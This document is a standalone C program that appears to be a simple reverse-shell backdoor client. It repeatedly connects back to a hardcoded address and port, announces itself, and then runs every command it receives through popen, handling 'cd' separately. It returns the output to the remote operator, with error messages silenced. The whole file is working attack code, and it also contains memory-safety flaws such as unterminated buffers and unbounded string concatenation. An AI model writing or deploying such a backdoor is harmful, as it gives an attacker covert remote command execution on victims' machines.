#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define SLEEP_TIME 10

int main()
{
	struct sockaddr_in ServerAddr;
	char ServerAddrStr[] = "127.0.0.1";
	int ClientSocket;
	int ServerPort = 8888;
	int addr_len = sizeof(ServerAddr);
	int Client;
	int iDataNum;
	memset(&ServerAddr, 0, addr_len);
	ServerAddr.sin_family = AF_INET;
	ServerAddr.sin_port = htons(ServerPort);
	ServerAddr.sin_addr.s_addr = inet_addr(ServerAddrStr);

	char buf[200] = {0};
	char tb[1450] = {0};
	char sendbuf[1450] = "Im 1";
	char dir[200] = {0};

	char *tmp = NULL;
	int i = 2;
	int connect_res = -1;
	FILE *fp = NULL;

	while((ClientSocket = socket(AF_INET, SOCK_STREAM, 0)) < 0)
	{
		//perror("Client SocketError\n");
		//return 1;
	}
	while(connect_res < 0)
	{
		connect_res = connect(ClientSocket, (struct sockaddr *)&ServerAddr, addr_len);
		if(connect_res < 0)
			sleep(SLEEP_TIME);
	}

	//printf("Client Connected With Server:%s...\n", ServerAddrStr);
	send(ClientSocket, sendbuf, strnlen(sendbuf, 1450), 0);
	memset(sendbuf, 0, 1450);

	while(1)
	{
		iDataNum = recv(ClientSocket, buf, 200, 0);
		//printf("%s.\n", buf);
		if(!memcmp(buf, "cd", 2))
		{
			tmp = &(buf[3]);
			i = 2;
			while(buf[i] != '\n' && i < 200)
				i++;
			memcpy(dir, tmp, i-3);
			chdir(dir);
			strcpy(sendbuf, dir);
			memset(dir, 0, 200);
		}
		else
		{
			fp = NULL;
			
			if((fp = popen(buf, "r")) == NULL)
			{
				printf("CommandError\n");
				close(ClientSocket);
				return 0;
			}
			while(fgets(tb, sizeof(tb), fp))
			{
				strcat(sendbuf, tb);
			}
		}

		while((ClientSocket = socket(AF_INET, SOCK_STREAM, 0)) < 0)
		{
			//perror("Client SocketError\n");
			//return 1;
		}
		connect_res = -1;
		while(connect_res < 0)
		{
			connect_res = connect(ClientSocket, (struct sockaddr *)&ServerAddr, addr_len);
			if(connect_res < 0)
				sleep(SLEEP_TIME);
		}

		//printf("%s", sendbuf);
		//printf("%s: %d.\n", sendbuf, strnlen(sendbuf, 1450));
		send(ClientSocket, sendbuf, strnlen(sendbuf, 1450), 0);

		memset(buf, 0, 200);
		memset(sendbuf, 0, 1450);
	}

	close(ClientSocket);
	return 0;
}
